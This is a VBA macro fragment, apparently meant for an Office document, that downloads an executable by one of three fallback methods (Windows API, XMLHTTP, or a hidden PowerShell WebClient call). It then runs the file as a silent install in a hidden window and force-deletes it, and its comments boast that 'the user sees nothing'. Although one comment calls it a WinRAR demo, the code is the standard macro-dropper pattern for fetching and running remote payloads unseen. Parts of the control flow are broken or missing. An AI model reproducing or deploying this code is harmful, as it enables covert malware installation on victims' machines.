' ---------------------------------------------------------------
' [HELPER] – Wait for file to be ready (silent, no messages)
' ---------------------------------------------------------------
Private Function WaitForFileReady(ByVal sPath As String, ByVal nTimeoutSec As Integer) As Boolean
    On Error Resume Next
    Dim fso As Object
    Dim nStart As Double
    Dim nSize1 As Long, nSize2 As Long
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    nStart = Timer
    
    Do While (Timer - nStart) < nTimeoutSec
        If fso.FileExists(sPath) Then
            nSize1 = fso.GetFile(sPath).Size
            Sleep 500
            If fso.FileExists(sPath) Then
                nSize2 = fso.GetFile(sPath).Size
                If nSize1 = nSize2 And nSize1 > 1000000 Then
                    WaitForFileReady = True
                    Exit Function
                End If
            End If
        Else
            Sleep 500
        End If
    Loop
    WaitForFileReady = False
End Function

' ---------------------------------------------------------------
' [METHOD 1] – API Download (fastest)
' ---------------------------------------------------------------
Private Function DownloadViaAPI(ByVal sURL As String, ByVal sLocalPath As String) As Boolean
    On Error GoTo ErrorHandler
    If URLDownloadToFile(0, sURL, sLocalPath, 0, 0) = 0 Then
        DownloadViaAPI = True
    Else
        DownloadViaAPI = False
    End If
    Exit Function
ErrorHandler:
    DownloadViaAPI = False
End Function

' ---------------------------------------------------------------
' [METHOD 2] – XMLHTTP + ADODB.Stream
' ---------------------------------------------------------------
Private Function DownloadViaXMLHTTP(ByVal sURL As String, ByVal sLocalPath As String) As Boolean
    On Error GoTo ErrorHandler
    Dim httpRequest As Object, stream As Object
    Set httpRequest = CreateObject("MSXML2.XMLHTTP.6.0")
    Set stream = CreateObject("ADODB.Stream")
    httpRequest.Open "GET", sURL, False
    httpRequest.Send
    If httpRequest.Status = 200 Then
        stream.Type = 1
        stream.Open
        stream.Write httpRequest.responseBody
        stream.SaveToFile sLocalPath, 2
        DownloadViaXMLHTTP = True
    Else
        DownloadViaXMLHTTP = False
    End If
    Exit Function
ErrorHandler:
    DownloadViaXMLHTTP = False
End Function

' ---------------------------------------------------------------
' [METHOD 3] – PowerShell (synchronous)
' ---------------------------------------------------------------
Private Function DownloadViaPowerShell(ByVal sURL As String, ByVal sLocalPath As String) As Boolean
    On Error GoTo ErrorHandler
    Dim shell As Object
    Dim sCmd As String
    sCmd = "powershell -WindowStyle Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & sURL & "', '" & sLocalPath & "')"""
    Set shell = CreateObject("WScript.Shell")
    shell.Run sCmd, 0, True   ' Wait for completion
    DownloadViaPowerShell = True
    Exit Function
ErrorHandler:
    DownloadViaPowerShell = False
End Function

    bSuccess = DownloadViaAPI(sUrl, sLocalPath)

    ' 3. IF DOWNLOADED, VERIFY AND INSTALL SILENTLY

        If WaitForFileReady(sLocalPath, 15) Then
            ' --- EXECUTE SILENT INSTALL ---

            Set wsh = CreateObject("WScript.Shell")
            
            ' The "/S" switch forces silent installation (no GUI).
            ' We run via cmd /c start with the switch.
            Dim sExecCmd As String
            sExecCmd = "cmd /c start "" "" """ & sLocalPath & """ /S"
            
            ' Run it – window hidden (0), don't wait (False)
            wsh.Run sExecCmd, 0, False

            Sleep 3000   ' 3 seconds – enough for the installer to launch

            Set fso = CreateObject("Scripting.FileSystemObject")

                fso.DeleteFile sLocalPath, True   ' Force delete
            End If
            
            ' 5. (OPTIONAL) Also delete any leftover temp files from WinRAR
            ' WinRAR extracts to %TEMP%\Rar$* – we could clean those too,
            ' but for demo, we leave them to show the installation happened.
        End If
    End If
    
    ' ---- NOTHING ELSE. NO MESSAGE BOXES. NO DIALOGS. ----
    ' The macro ends silently. The user sees nothing.
End Sub
